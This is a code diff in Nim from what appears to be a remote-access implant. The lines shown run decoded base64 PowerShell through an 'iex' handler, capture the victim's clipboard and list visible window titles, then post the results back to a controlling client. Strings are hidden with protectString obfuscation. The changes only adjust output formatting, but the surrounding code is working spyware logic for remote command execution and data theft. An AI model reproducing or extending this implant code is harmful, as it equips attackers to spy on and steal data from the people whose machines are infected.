@@ -130,14 +130,14 @@ proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_modu
     if ps_module == "":
         data = {
             protectString("powershell_command"): decode_64(encoded_powershell_command),
-            protectString("output"): output
+            protectString("output"): "\n" & output
         }.toOrderedTable()
         is_success = post_data(client, protectString("iex"), $data)
     
     # command came from ps_module
     else:
         data = {
-            protectString("output"): output
+            protectString("output"): "\n" & output
         }.toOrderedTable()
         is_success = post_data(client, ps_module, $data)
 
@@ -177,7 +177,7 @@ proc wrap_get_clipboard(): bool =
     
     var data = {
         protectString("is_success"): $is_success,
-        protectString("clipboard"): clipboard
+        protectString("clipboard"): "\n" & clipboard
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("clipboard") , $data)
@@ -193,7 +193,7 @@ proc enum_visible_windows(): bool =
     try:
         for i in windows():
             if i.isVisible() and i.getTitle().len() > 1:
-                windows.add("[" & i.getTitle() & "]\n")
+                windows.add("[+] [" & i.getTitle() & "]\n")
         is_success = true
     except:
         is_success = false
@@ -201,7 +201,7 @@ proc enum_visible_windows(): bool =
     
     var data = {
         protectString("is_success"): $is_success,
-        protectString("windows"): windows
+        protectString("windows"): "\n" & windows
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("windows") , $data)
